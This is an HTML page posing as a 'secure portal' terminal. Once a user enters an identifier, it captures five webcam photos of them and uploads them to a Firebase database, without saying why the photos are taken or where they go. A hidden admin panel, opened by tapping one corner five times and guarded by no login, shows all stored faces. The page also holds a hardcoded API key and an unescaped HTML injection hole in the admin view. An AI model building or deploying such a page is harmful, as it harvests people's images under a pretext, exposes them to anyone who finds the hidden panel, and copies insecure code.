<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cyber Terminal - Secure Portal</title>
<style>
*{box-sizing:border-box}html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#030712;font-family:'Courier New',Courier,monospace;color:#00ff66}
body{background:radial-gradient(circle at center,#051e11 0%,#030712 100%)}
button,input{font-family:inherit}
.corner-dot{position:fixed;width:14px;height:14px;background:#00ff66;border-radius:50%;opacity:0.2;cursor:pointer;z-index:9999;transition:opacity 0.2s}
.corner-dot:hover{opacity:1}
.dot-tl{top:12px;left:12px}
.dot-tr{top:12px;right:12px}
.dot-bl{bottom:12px;left:12px}
.dot-br{bottom:12px;right:12px}
.container{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;padding:20px;text-align:center}
.terminal-box{background:rgba(0,20,10,0.85);border:1px solid #00ff66;box-shadow:0 0 20px rgba(0,255,102,0.2);padding:30px;border-radius:8px;width:100%;max-width:400px}
h1{font-size:22px;margin-bottom:20px;letter-spacing:2px;text-shadow:0 0 8px rgba(0,255,102,0.5)}
input{width:100%;padding:12px;margin-bottom:15px;background:#010c05;border:1px solid #00ff66;color:#00ff66;border-radius:4px;outline:none;font-size:16px}
input::placeholder{color:rgba(0,255,102,0.4)}
button.cyber-btn{width:100%;padding:12px;background:#00ff66;color:#030712;border:none;border-radius:4px;font-weight:bold;font-size:16px;cursor:pointer;transition:background 0.2s,box-shadow 0.2s}
button.cyber-btn:hover{background:#00cc52;box-shadow:0 0 10px #00ff66}
.hidden{display:none!important}
#view-app{position:relative}
.scan-line{position:absolute;top:0;left:0;width:100%;height:2px;background:rgba(0,255,102,0.5);box-shadow:0 0 8px #00ff66;animation:scan 3s linear infinite}
@keyframes scan{0%{top:0}100%{top:100%}}
.admin-panel{position:fixed;top:0;left:0;width:100%;height:100%;background:#030712;z-index:9998;padding:20px;overflow-y:auto;text-align:left}
.admin-header{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #00ff66;padding-bottom:10px;margin-bottom:20px}
.session-card{background:rgba(0,20,10,0.6);border:1px solid #00ff66;padding:15px;margin-bottom:15px;border-radius:6px}
.photo-grid{display:flex;flex-wrap:wrap;gap:10px;margin-top:10px}
.photo-grid img{width:70px;height:70px;object-fit:cover;border:1px solid #00ff66;border-radius:4px}
</style>
</head>
<body>

<div class="corner-dot dot-tl" onclick="handleCornerTap('tl')"></div>
<div class="corner-dot dot-tr" onclick="handleCornerTap('tr')"></div>
<div class="corner-dot dot-bl" onclick="handleCornerTap('bl')"></div>
<div class="corner-dot dot-br" onclick="handleCornerTap('br')"></div>

<!-- LOGIN VIEW -->
<div id="view-login" class="container">
  <div class="terminal-box">
    <h1>CYBER TERMINAL</h1>
    <input type="text" id="username-input" placeholder="ENTER IDENTIFIER">
    <button class="cyber-btn" onclick="handleLogin()">INITIALIZE</button>
  </div>
</div>

<!-- APP VIEW -->
<div id="view-app" class="container hidden">
  <div class="scan-line"></div>
  <div class="terminal-box">
    <h1>SECURE PORTAL ACTIVE</h1>
    <p id="welcome-msg" style="margin-bottom:20px;font-size:14px;color:rgba(0,255,102,0.8);"></p>
    <button class="cyber-btn" id="capture-btn" onclick="startCaptureSequence()">START CAPTURE</button>
  </div>
</div>

<!-- ADMIN PANEL -->
<div id="view-admin" class="admin-panel hidden">
  <div class="admin-header">
    <h2>MASTER ADMIN PANEL</h2>
    <button class="cyber-btn" style="width:auto;padding:6px 15px;" onclick="closeAdmin()">Back</button>
  </div>
  <div id="admin-content">Loading sessions...</div>
</div>

<video id="webcam" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<!-- Firebase SDKs -->
<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
  import { getFirestore, collection, addDoc, getDocs, query, orderBy, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

  // New Firebase Project Configuration
  const firebaseConfig = {
    apiKey: "AIzaSyAPLvduSxj9OQkP9DQ37CE7nmtoaDPFaHY",
    authDomain: "shjsdjj-b59c8.firebaseapp.com",
    projectId: "shjsdjj-b59c8",
    storageBucket: "shjsdjj-b59c8.firebasestorage.app",
    messagingSenderId: "161636495943",
    appId: "1:161636495943:web:d1949bf0f0d21e40abf762",
    measurementId: "G-1L322WQWC4"
  };

  const app = initializeApp(firebaseConfig);
  const db = getFirestore(app);

  let currentUser = "";
  let tapCounts = { tl:0, tr:0, bl:0, br:0 };
  let tapTimers = { tl:null, tr:null, bl:null, br:null };

  window.handleLogin = function() {
    const val = document.getElementById('username-input').value.trim();
    if(!val) { alert("Please enter an identifier"); return; }
    currentUser = val;
    document.getElementById('welcome-msg').innerText = `NODE USER: ${currentUser}`;
    document.getElementById('view-login').classList.add('hidden');
    document.getElementById('view-app').classList.remove('hidden');
  };

  window.startCaptureSequence = async function() {
    const btn = document.getElementById('capture-btn');
    btn.disabled = true;
    btn.innerText = "INITIALIZING...";

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
      const video = document.getElementById('webcam');
      video.srcObject = stream;
      await new Promise(resolve => video.onloadedmetadata = resolve);

      let photos = [];
      const canvas = document.getElementById('canvas');
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext('2d');

      for(let i = 1; i <= 5; i++) {
        btn.innerText = `CAPTURING [${i}/5]`;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        photos.push(canvas.toDataURL('image/jpeg', 0.7));
        await new Promise(r => setTimeout(r, 600));
      }

      stream.getTracks().forEach(track => track.stop());

      btn.innerText = "SYNCING DATA...";
      await addDoc(collection(db, "sessions"), {
        username: currentUser,
        timestamp: serverTimestamp(),
        photos: photos
      });

      btn.innerText = "CAPTURE COMPLETE";
      setTimeout(() => {
        btn.disabled = false;
        btn.innerText = "START CAPTURE";
      }, 3000);

    } catch(err) {
      console.err(err);
      alert("Camera access error or permission denied.");
      btn.disabled = false;
      btn.innerText = "START CAPTURE";
    }
  };

  window.handleCornerTap = function(corner) {
    clearTimeout(tapTimers[corner]);
    tapCounts[corner]++;
    if(tapCounts[corner] === 5) {
      tapCounts[corner] = 0;
      if(corner === 'bl') {
        openAdminPanel();
      }
    }
    tapTimers[corner] = setTimeout(() => { tapCounts[corner] = 0; }, 800);
  };

  async function openAdminPanel() {
    document.getElementById('view-admin').classList.remove('hidden');
    const content = document.getElementById('admin-content');
    content.innerHTML = "Fetching database records...";

    try {
      const q = query(collection(db, "sessions"), orderBy("timestamp", "desc"));
      const querySnapshot = await getDocs(q);
      
      if(querySnapshot.empty) {
        content.innerHTML = "<p>No sessions recorded yet.</p>";
        return;
      }

      let html = "";
      querySnapshot.forEach((docSnap) => {
        const data = docSnap.data();
        const timeStr = data.timestamp ? new Date(data.timestamp.toDate()).toLocaleString() : "Just now";
        html += `<div class="session-card">
          <strong>User:</strong> ${data.username || "Anonymous"}<br>
          <strong>Time:</strong> ${timeStr}
          <div class="photo-grid">`;
        if(data.photos && data.photos.length > 0) {
          data.photos.forEach(p => {
            html += `<img src="${p}" />`;
          });
        }
        html += `</div></div>`;
      });
      content.innerHTML = html;
    } catch(e) {
      content.innerHTML = `<p style="color:#ff3333;">Error loading data: ${e.message}</p>`;
    }
  }

  window.closeAdmin = function() {
    document.getElementById('view-admin').classList.add('hidden');
  };
</script>

</body>
</html>
